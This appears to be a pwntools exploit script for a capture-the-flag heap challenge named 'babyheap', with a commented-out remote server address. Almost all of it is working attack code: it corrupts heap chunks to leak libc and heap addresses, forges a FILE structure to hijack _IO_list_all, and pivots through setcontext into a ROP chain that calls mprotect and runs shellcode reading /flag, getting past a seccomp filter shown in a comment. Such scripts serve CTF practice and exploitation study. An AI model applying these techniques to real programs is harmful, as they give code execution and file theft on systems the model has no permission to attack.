from pwn import *

p = process("./babyheap")
#p = remote("139.180.215.222",20001)


context.arch = "amd64"

main_arena = 0x3c4b20
_IO_list_all = 0x3c5520
_IO_stdfile_2_lock = 0x3c6770
system = 0x45390
setcontext = 0x47b75
poprspret = 0x7ef0c
poprdiret = 0x0000000000021102
poprdxrsiret = 0x00000000001150c9
mprotect = 0x101770



def add(size):
	p.sendlineafter(":","1")
	p.sendlineafter("ze:",str(size))

def edit(idx,content):
	p.sendlineafter("ce:","2")
	p.sendlineafter("ex:",str(idx))
	p.sendafter("nt:",content)

def delete(idx):
	p.sendlineafter("ce:","3")
	p.sendlineafter("ex:",str(idx))

def show(idx):
	p.sendlineafter("ce:","4")
	p.sendlineafter("ex:",str(idx))

'''
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003
 0002: 0x06 0x00 0x00 0x00000000  return KILL
 0003: 0x20 0x00 0x00 0x00000000  A = sys_number
 0004: 0x15 0x00 0x01 0x00000029  if (A != socket) goto 0006
 0005: 0x06 0x00 0x00 0x00000000  return KILL
 0006: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0008
 0007: 0x06 0x00 0x00 0x00000000  return KILL
 0008: 0x15 0x00 0x01 0x00000039  if (A != fork) goto 0010
 0009: 0x06 0x00 0x00 0x00000000  return KILL
 0010: 0x15 0x00 0x01 0x0000009d  if (A != prctl) goto 0012
 0011: 0x06 0x00 0x00 0x00000000  return KILL
 0012: 0x15 0x00 0x01 0x0000003a  if (A != vfork) goto 0014
 0013: 0x06 0x00 0x00 0x00000000  return KILL
 0014: 0x15 0x00 0x01 0x00000065  if (A != ptrace) goto 0016
 0015: 0x06 0x00 0x00 0x00000000  return KILL
 0016: 0x15 0x00 0x01 0x0000003e  if (A != kill) goto 0018
 0017: 0x06 0x00 0x00 0x00000000  return KILL
 0018: 0x15 0x00 0x01 0x00000038  if (A != clone) goto 0020
 0019: 0x06 0x00 0x00 0x00000000  return KILL
 0020: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 '''

add(0x108) #0 
add(0x200) #1
add(0x200) #2
add(0x200) #3
add(0x68) #4
add(0x68) #5
add(0x410) #6
add(0x410) #7

edit(1,"A"*0x1f0+p64(0x200))
delete(1)
edit(0,"B"*0x108)

add(0x60) #1
add(0xc0) #8
add(0xb0) #9

delete(1)
delete(2)

add(0x60) #1

show(8)

libcbase = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00") - (0x3c4b20+88)

print hex(libcbase)

add(0x3a0) #2

delete(6)
delete(2)

show(8)

p.recvuntil(" ")
heapbase = u64(p.recvline()[:-1]+"\x00\x00") - 0x820

print hex(heapbase)

add(0x410)
delete(1)
add(0x70) #1
add(0x200) #6
add(0x90) #9


fake_struct =  p64(0) + p64(libcbase + _IO_list_all - 0x10)
fake_struct += p64(0) #fp->_wide_data->_IO_write_base
fake_struct += p64(1)*1 #fp->_wide_data->_IO_write_ptr
fake_struct += p64(0)*11
fake_struct += p64(libcbase + _IO_stdfile_2_lock)
fake_struct += p64(0)*2
fake_struct += p64(heapbase + 0x2d0) #widedata
fake_struct += p64(libcbase+poprspret) + p64(0)*2
fake_struct += p64(1) #mode
fake_struct += p64(0)*2
fake_struct += p64(heapbase+0x270) #vtable
fake_struct += p64(libcbase+setcontext)*10
fake_struct += p64(heapbase+0x2f8)*5+p64(0)+ p64(1)


shellcode = shellcraft.pushstr("/flag")+'''
mov rdi , rsp
xor rsi , rsi
mov rax , SYS_open
syscall

mov rdi , rax
mov rsi , rsp
mov rdx , 0x100
mov rax , SYS_read
syscall

mov rdi , 1
mov rax , SYS_write
syscall
'''


pay = p64(libcbase+poprdiret) + p64(heapbase) + p64(libcbase+poprdxrsiret) + p64(7) + p64(0x1000) + p64(libcbase + mprotect)\
+ p64(heapbase+0x330) + asm(shellcode)

edit(6,fake_struct + pay)
delete(6)
edit(8,"/bin/sh\x00"+p64(0x61)+p64(0) + p64(libcbase + _IO_list_all - 0x10))
edit(7,"A"*0x100)
delete(7)

p.interactive()
